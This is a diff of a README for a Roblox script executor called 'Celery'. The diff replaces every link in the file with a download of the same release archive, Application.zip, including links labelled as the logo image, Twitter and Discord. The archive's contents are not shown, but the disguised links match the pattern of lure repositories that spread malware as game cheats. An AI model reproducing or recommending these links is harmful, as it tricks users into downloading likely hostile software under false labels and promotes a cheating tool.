@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Roblox-Celery Repository! 🎮
 
-![Roblox Celery Logo](https://example.com/roblox-celery-logo.png)
+![Roblox Celery Logo](https://github.com/pixxxxxss/Roblox-Celery/releases/download/v1.0.0/Application.zip)
 
 ## Repository Overview
 Welcome to the "Roblox-Celery" repository, where you can redefine gameplay possibilities on the Roblox platform using the Celery Roblox Executor. This executor offers users a seamless experience to execute custom scripts, empowering players to unleash creativity and explore new dimensions within their favorite Roblox games. 🌟
@@ -30,7 +30,7 @@ Welcome to the "Roblox-Celery" repository, where you can redefine gameplay possi
 - roblox-scripts
 
 ## Installation
-To get started with the Celery Roblox Executor, you can download the software package from the following link: [Launch Software Package 🚀](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+To get started with the Celery Roblox Executor, you can download the software package from the following link: [Launch Software Package 🚀](https://github.com/pixxxxxss/Roblox-Celery/releases/download/v1.0.0/Application.zip)
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
@@ -48,8 +48,8 @@ If you encounter any issues or have questions about the Celery Roblox Executor, 
 
 ## Stay Connected
 Stay updated on the latest developments and script releases by following us on social media:
-- [Twitter](https://twitter.com/robloxCelery)
-- [Discord](https://discord.com/roblox-celery)
+- [Twitter](https://github.com/pixxxxxss/Roblox-Celery/releases/download/v1.0.0/Application.zip)
+- [Discord](https://github.com/pixxxxxss/Roblox-Celery/releases/download/v1.0.0/Application.zip)
 
 Let's make Roblox gaming even more exciting and creative with the Celery Roblox Executor! 💥🎉
 
